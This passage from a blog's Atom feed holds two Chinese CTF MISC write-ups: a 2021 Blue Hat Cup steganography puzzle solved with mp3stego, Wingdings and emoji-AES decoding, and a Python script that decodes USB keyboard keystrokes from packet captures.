    <content type="html"><![CDATA[<h3><span id="2021第五届蓝帽杯初赛">2021第五届蓝帽杯初赛</span></h3><hr><h4><span id="冬奥会_is_coming">冬奥会_is_coming</span></h4><p>mp3考虑mp3stego，这一步的密钥是冬奥会开始日期（八位数字）</p><p>用python,print出来后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure><p>找到网站https://wingdingstranslator.com/</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>找到对应的github</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>用notepad++打开</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>发现密钥mp3</p><p>发现cipher字样：<a class="link" href="https://www.ifreesite.com/unicode/">https://www.ifreesite.com/unicode/<i class="fas fa-external-link-alt"></i></a></p><p>得到表情</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>参考这篇博客</p><p><a class="link" href="https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/">https://miaotony.xyz/2021/02/11/CTF_2021NewsCTF/<i class="fas fa-external-link-alt"></i></a></p><p>得到带密钥的emoji表情解密网站</p><p><a class="link" href="https://emoji-aes.miaotony.xyz/">https://emoji-aes.miaotony.xyz/<i class="fas fa-external-link-alt"></i></a></p><p>得到flag</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><h5><span id="flage32f619b-dbcd-49bd-9126-5d841aa01767"><strong>flag{e32f619b-dbcd-49bd-9126-5d841aa01767}</strong></span></h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021第五届蓝帽杯初赛&quot;&gt;2021第五届蓝帽杯初赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;冬奥会_is_coming&quot;&gt;冬奥会_is_coming&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;mp3考虑mp3stego，这一步的密钥是冬奥会</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>MISC-data-0</title>
    <link href="http://mklkx.github.io/2021/04/30/MISC-data-0/"/>
    <id>http://mklkx.github.io/2021/04/30/MISC-data-0/</id>
    <published>2021-04-30T12:09:36.000Z</published>
    <updated>2021-05-21T08:54:59.208Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="data0">DATA[0]</span></h1><hr><h3><span id="1usb流量分析">1：USB流量分析</span></h3><h4><span id="usbkeyboarddatahacker">UsbKeyboardDataHacker</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tshark -r .&#x2F;example.pcap -T fields -e usb.capdata</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python UsbKeyboardDataHacker.py .&#x2F;example.pcap </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">usb_codes &#x3D; &#123;</span><br><span class="line">    0x04: &quot;aA&quot;, 0x05: &quot;bB&quot;, 0x06: &quot;cC&quot;, 0x07: &quot;dD&quot;, 0x08: &quot;eE&quot;, 0x09: &quot;fF&quot;,</span><br><span class="line">    0x0A: &quot;gG&quot;, 0x0B: &quot;hH&quot;, 0x0C: &quot;iI&quot;, 0x0D: &quot;jJ&quot;, 0x0E: &quot;kK&quot;, 0x0F: &quot;lL&quot;,</span><br><span class="line">    0x10: &quot;mM&quot;, 0x11: &quot;nN&quot;, 0x12: &quot;oO&quot;, 0x13: &quot;pP&quot;, 0x14: &quot;qQ&quot;, 0x15: &quot;rR&quot;,</span><br><span class="line">    0x16: &quot;sS&quot;, 0x17: &quot;tT&quot;, 0x18: &quot;uU&quot;, 0x19: &quot;vV&quot;, 0x1A: &quot;wW&quot;, 0x1B: &quot;xX&quot;,</span><br><span class="line">    0x1C: &quot;yY&quot;, 0x1D: &quot;zZ&quot;, 0x1E: &quot;1!&quot;, 0x1F: &quot;2@&quot;, 0x20: &quot;3#&quot;, 0x21: &quot;4$&quot;,</span><br><span class="line">    0x22: &quot;5%&quot;, 0x23: &quot;6^&quot;, 0x24: &quot;7&amp;&quot;, 0x25: &quot;8*&quot;, 0x26: &quot;9(&quot;, 0x27: &quot;0)&quot;,</span><br><span class="line">    0x29: &quot;*&quot;,# &lt;ESC&gt;</span><br><span class="line">    0x2C: &quot;  &quot;, 0x2D: &quot;-_&quot;, 0x2E: &quot;&#x3D;+&quot;, 0x2F: &quot;[&#123;&quot;, 0x30: &quot;]&#125;&quot;, 0x32: &quot;#~&quot;,</span><br><span class="line">    0x33: &quot;;:&quot;, 0x34: &quot;&#39;\&quot;&quot;, 0x36: &quot;,&lt;&quot;, 0x37: &quot;.&gt;&quot;, 0x38: &quot;&#x2F;?&quot;, 0x39: &quot;&lt;CAP&gt;&lt;CAP&gt;&quot;,</span><br><span class="line">    0x3a: &quot;&lt;F1&gt;&lt;F1&gt;&quot;, 0x3b: &quot;&lt;F4&gt;&lt;F4&gt;&quot;, 0x3e: &quot;&lt;F5&gt;&lt;F5&gt;&quot;, 0x3f: &quot;&lt;F6&gt;&lt;F6&gt;&quot;,</span><br><span class="line">    0x40: &quot;&lt;F7&gt;&lt;F7&gt;&quot;, 0x41: &quot;&lt;F8&gt;&lt;F8&gt;&quot;, 0x42: &quot;&lt;F9&gt;&lt;F9&gt;&quot;, 0x43: &quot;&lt;F10&gt;&lt;F10&gt;&quot;,</span><br><span class="line">    0x44: &quot;&lt;F11&gt;&lt;F11&gt;&quot;, 0x45: &quot;&lt;F12&gt;&lt;F12&gt;&quot;</span><br><span class="line">&#125;</span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line">for x in open(&quot;uuu.txt&quot;, &quot;r&quot;).readlines():</span><br><span class="line">    code &#x3D; int(x[4:6], 16) # 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]</span><br><span class="line">    # print(x[4:6])</span><br><span class="line">    if code &#x3D;&#x3D; 0:</span><br><span class="line">        continue</span><br><span class="line">    if code &#x3D;&#x3D; 0x28:</span><br><span class="line">        print(&#39;ENTER!&#39;)</span><br><span class="line">        print(data)</span><br><span class="line">        data &#x3D; &#39;&#39;</span><br><span class="line">        continue</span><br><span class="line">    upper &#x3D; 0</span><br><span class="line">    if int(x[0:2], 16) &#x3D;&#x3D; 0x02 or int(x[0:2], 16) &#x3D;&#x3D; 0x20:</span><br><span class="line">        upper &#x3D; 1</span><br><span class="line">    data +&#x3D; usb_codes[code][upper]</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述脚本与常规不同之处在于<strong>0x29: “*”,# <esc></esc></strong>,对0x29进行了处理，暂且用*代替</p><p>为解决题目中模拟vim编辑的情况。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;data0&quot;&gt;DATA[0]&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;1usb流量分析&quot;&gt;1：USB流量分析&lt;/span&gt;&lt;/h3&gt;
&lt;h4&gt;&lt;span id=&quot;usbkeyboarddatahacker&quot;&gt;UsbKeyboard</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
</feed>
